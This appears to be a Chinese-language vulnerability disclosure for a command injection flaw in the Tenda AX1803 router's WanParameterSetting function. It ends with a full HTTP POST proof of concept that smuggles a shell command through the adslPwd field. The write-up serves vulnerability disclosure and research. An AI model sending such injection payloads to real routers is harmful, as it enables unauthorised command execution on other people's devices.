

# ***\*腾达AX1803存在命令注入漏洞\****

## ***\*概述\****

• ***\*类型\****：命令注入漏洞

• ***\*供应商\****：腾达（https://tenda.com.cn）

• ***\*产品\****: WiFi 路由器 AX1803

• ***\*固件下载地址：\**** [AX1803升级软件_腾达(Tenda)官方网站](https://www.tenda.com.cn/download/detail-3225.html)

• ***\*固件下载地址：\****https://down.tenda.com.cn/uploadfile/AX1803/US_AX1803v2.1br_v1.0.0.1_2890_CN_ZGYD01.zip

TendaAX1803路由器采用WiFi 6(802.11ax)技术，双频并发速率高达1775Mbps (2.4GHz：574Mbps，5GHz：1201Mbps)，相比上一代WiFi 5标准的AC1200路由器，无线速率提升50%，传输距离更远；搭载1.5GHz高性能四核处理器，全面提升网络负载能力，数据转发更快，长时间运行更稳定；采用OFDMA+MU-MIMO技术，满足更多设备同时上网，传输效率显著提高，延时大幅降低，多人在线游戏、观看超清视频更流畅，是构建多媒体家庭网络的首选设备！WanParameterSetting存在命令执行漏洞



## ***\*描述\****

### ***\*一、产品信息：\****

腾达AX1803路由器最新版仿真概述：

![image-20220624183557535](img/image-20220624183557535.png)

 

 

 

### ***\*2.漏洞详情\****

腾达AX1803被发现在WanParameterSetting函数中存在命令注入漏洞

![image-20220624133917486](img/image-20220624133917486.png)

![image-20220625112118028](img/image-20220625112118028.png)

判断为非0为真，当我们抓包改adslPwd参数后，我们会在设置后得到一个命令注入漏洞。

![img](/img/aaa.png)

 





## ***\*3. 复现出现的漏洞和 POC\****

为了重现漏洞，可以遵循以下步骤：

通过qemu-system或其他方式启动固件（真机）

使用以下 POC 攻击进行攻击

注意替换cookie中的密码字段

```
POST /goform/WanParameterSetting?0.8762489734485668 HTTP/1.1
Host: i92.168.68.150
Connection: close
Content-Length: 191
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36
sec-ch-ua-platform: "macOS"
Origin: https://i92.168.68.150
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://192.168.2.1/main.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: password=edeff4d6d98974e46457a587e2e724a2ndy5gk

wanType=2&adslUser=aaaa&adslPwd=$(ls > /tmp/xxx)&vpnServer=&vpnUser=&vpnPwd=&vpnWanType=l&dnsAuto=1&staticIp=&mask=&gateway=&dnsl=&dns2=&module=wanl&downSpeedLimit=
```

 